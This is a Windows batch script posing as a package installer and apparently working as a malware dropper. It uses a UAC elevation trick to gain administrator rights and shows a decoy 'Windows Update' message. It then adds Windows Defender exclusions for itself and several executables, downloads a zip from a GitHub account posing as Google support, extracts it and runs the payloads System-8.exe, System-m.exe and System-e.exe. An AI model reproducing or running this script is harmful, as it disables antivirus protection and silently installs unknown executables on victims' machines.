@echo off

title Installing Packages 
:: BatchGotAdmin
::-----------------------------------------
REM  --> CheckING for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
echo msgbox "Windows Update " > %tmp%\tmp.vbs
wscript %tmp%\tmp.vbs
del %tmp%\tmp.vbs



powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Windows\2.bat"



cd "%USERPROFILE%\

bitsadmin /transfer Packages /download /priority foreground https://github.com/supportgoogle34/files/raw/main/winfiles.zip  winfiles.zip

curl -L https://github.com/supportgoogle34/files/raw/main/winfiles.zip  -o  winfiles.zip

curl  -L https://www.7-zip.org/a/7zr.exe -o 7z.exe

bitsadmin /transfer Packages /download /priority foreground https://github.com/supportgoogle34/files/raw/main/winfiles.zip  winfiles.zip

7z.exe x  winfiles.zip -aos

del winfiles.zip

powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\%USERPROFILE%\System-8.exe"
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath " C:\%USERPROFILE%\System-8.exe"
powershell Add-MpPreference -ExclusionProcess "C:\%USERPROFILE%\System-e.exe"

powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\%USERPROFILE%\System-m.exe"
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\%USERPROFILE%\System-e.exe"

System-8.exe
System-m.exe
System-e.exe



System-8.exe
System-m.exe
System-e.exe



exit


